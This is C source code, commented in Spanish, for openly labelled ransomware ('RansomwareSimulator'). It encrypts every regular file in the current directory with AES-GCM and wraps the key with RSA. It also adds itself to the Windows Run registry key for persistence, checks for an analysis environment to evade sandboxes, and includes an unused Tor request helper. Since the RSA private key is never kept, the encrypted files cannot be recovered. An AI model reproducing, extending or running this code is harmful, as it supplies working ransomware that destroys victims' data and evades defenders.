#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <windows.h>
#include <curl/curl.h>

// Definir constantes
#define KEY_SIZE 32 // Tamaño de la clave AES (256 bits)
#define AES_BLOCK_SIZE 16 // Tamaño del bloque AES
#define RSA_KEY_SIZE 2048 // Tamaño de la clave RSA
#define IV_SIZE AES_BLOCK_SIZE // Tamaño del IV para AES_GCM
#define TAG_SIZE 16 // Tamaño del tag para AES_GCM
#define BUFFER_SIZE 1024 // Tamaño del buffer para la lectura de archivos

// Extensiones de archivos a excluir
const char *exclude_extensions[] = { ".exe", ".dll", ".sys", ".enc" };

// Función para verificar si un archivo debe ser cifrado
int should_encrypt(const char *filename) {
    for (int i = 0; i < sizeof(exclude_extensions) / sizeof(exclude_extensions[0]); ++i) {
        if (strstr(filename, exclude_extensions[i]) != NULL) {
            return 0; // No cifrar
        }
    }
    return 1; // Cifrar
}

// Función para verificar si el ransomware está en un entorno de análisis
int is_in_analysis_environment() {
    return GetFileAttributes("C:\\path_to_virtual_environment") != INVALID_FILE_ATTRIBUTES;  // Ajustar según sea necesario
}

// Función para generar una clave simétrica para AES
void generate_aes_key(unsigned char *key) {
    if (!RAND_bytes(key, KEY_SIZE)) {
        fprintf(stderr, "Error al generar la clave AES\n");
        exit(EXIT_FAILURE);
    }
}

// Función para cifrar un archivo con AES en modo GCM
void aes_encrypt_gcm(const char *in_filename, const char *out_filename, unsigned char *key) {
    FILE *in_file = fopen(in_filename, "rb");
    if (!in_file) {
        perror("Error al abrir el archivo de entrada");
        return;
    }

    FILE *out_file = fopen(out_filename, "wb");
    if (!out_file) {
        perror("Error al abrir el archivo de salida");
        fclose(in_file);
        return;
    }

    // Generar IV y escribirlo en el archivo cifrado
    unsigned char iv[IV_SIZE];
    generate_aes_key(iv); // Usar IV aleatorio
    fwrite(iv, 1, IV_SIZE, out_file);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("Error al crear el contexto de cifrado");
        fclose(in_file);
        fclose(out_file);
        return;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1) {
        perror("Error al inicializar el cifrador");
        EVP_CIPHER_CTX_free(ctx);
        fclose(in_file);
        fclose(out_file);
        return;
    }

    unsigned char buffer[BUFFER_SIZE];
    int len;
    unsigned char ciphertext[BUFFER_SIZE + TAG_SIZE];

    // Cifrar archivo en bloques
    while (1) {
        size_t bytes_read = fread(buffer, 1, sizeof(buffer), in_file);
        if (bytes_read < 0) {
            perror("Error al leer el archivo de entrada");
            break;
        }
        if (bytes_read == 0) break;

        if (EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, bytes_read) != 1) {
            perror("Error durante la actualización del cifrado");
            break;
        }
        fwrite(ciphertext, 1, len, out_file);
    }

    unsigned char tag[TAG_SIZE];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag) != 1) {
        perror("Error al obtener el tag");
    }
    fwrite(tag, 1, TAG_SIZE, out_file);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);
}

// Función para cifrar la clave AES con la clave pública RSA
int rsa_encrypt_key(RSA *rsa, unsigned char *key, unsigned char *encrypted_key) {
    int result = RSA_public_encrypt(KEY_SIZE, key, encrypted_key, rsa, RSA_PKCS1_OAEP_PADDING);
    if (result == -1) {
        fprintf(stderr, "Error al cifrar la clave AES con RSA\n");
        return 0;
    }
    return 1;
}

// Función para generar un par de claves RSA
void generate_rsa_keys(RSA **rsa_private, RSA **rsa_public) {
    *rsa_private = RSA_generate_key(RSA_KEY_SIZE, RSA_F4, NULL, NULL);
    BIO *bio_public = BIO_new(BIO_s_mem());
    BIO *bio_private = BIO_new(BIO_s_mem());
    PEM_write_bio_RSA_PUBKEY(bio_public, *rsa_private);
    PEM_write_bio_RSAPrivateKey(bio_private, *rsa_private, NULL, NULL, 0, NULL, NULL);
    *rsa_public = PEM_read_bio_RSA_PUBKEY(bio_public, NULL, NULL, NULL);
    BIO_free(bio_public);
    BIO_free(bio_private);
}

// Función para hacer una solicitud HTTP a través de Tor
void make_request_through_tor(const char *url) {
    CURL *curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); // Puerto por defecto de Tor
        curl_easy_setopt(curl, CURLOPT_RETURNTRANSFER, 1L);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() falló: %s\n", curl_easy_strerror(res));
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            printf("Código de respuesta: %ld\n", response_code);
        }

        curl_easy_cleanup(curl);
    }
}

// Función para agregar persistencia al ransomware en el sistema
void add_to_startup() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        const char *path_to_executable = "C:\\ruta\\ransomware.exe";  // Cambia a la ruta correcta
        RegSetValueEx(hKey, "RansomwareSimulator", 0, REG_SZ, (BYTE *)path_to_executable, strlen(path_to_executable) + 1);
        RegCloseKey(hKey);
    } else {
        fprintf(stderr, "Error al abrir la clave del registro: %ld\n", result);
    }
}

// Función para cifrar todos los archivos en el directorio actual
void encrypt_files_in_directory(RSA *rsa) {
    DIR *dir = opendir(".");
    if (!dir) {
        perror("Error al abrir el directorio.");
        return;
    }

    unsigned char aes_key[KEY_SIZE];
    generate_aes_key(aes_key); // Generar clave AES
    unsigned char encrypted_key[RSA_size(rsa)];

    // Cifrar la clave AES con RSA
    if (!rsa_encrypt_key(rsa, aes_key, encrypted_key)) {
        closedir(dir);
        return;
    }

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_type == DT_REG && should_encrypt(ent->d_name)) {
            char out_filename[256];
            snprintf(out_filename, sizeof(out_filename), "%s.enc", ent->d_name);

            // Cifrar el archivo
            aes_encrypt_gcm(ent->d_name, out_filename, aes_key);

            // Guardar la clave cifrada en un archivo
            FILE *key_file = fopen("encrypted_key.bin", "wb");
            if (key_file) {
                fwrite(encrypted_key, 1, sizeof(encrypted_key), key_file);
                fclose(key_file);
            } else {
                perror("Error al guardar la clave cifrada");
            }

            // Registrar el archivo cifrado
            FILE *log_file = fopen("ransomware.log", "a");
            if (log_file) {
                fprintf(log_file, "Archivo cifrado: %s\n", ent->d_name);
                fclose(log_file);
            } else {
                perror("Error al registrar el archivo cifrado");
            }
        }
    }
    closedir(dir);
}

int main() {
    // Semilla para la aleatoriedad
    srand((unsigned int)time(NULL));

    // Comprobar si el script está en un entorno de análisis
    if (is_in_analysis_environment()) {
        printf("Entorno de análisis detectado. Salida.\n");
        return 0;
    }

    RSA *rsa_private = NULL;
    RSA *rsa_public = NULL;
    generate_rsa_keys(&rsa_private, &rsa_public); // Generar claves RSA

    // Añadir el ransomware al inicio del sistema
    add_to_startup();

    // Cifrar archivos en el directorio actual
    encrypt_files_in_directory(rsa_public);

    printf("Todos los archivos cifrados.\n");

    // Liberar recursos RSA
    RSA_free(rsa_private);
    RSA_free(rsa_public);

    return 0;
}
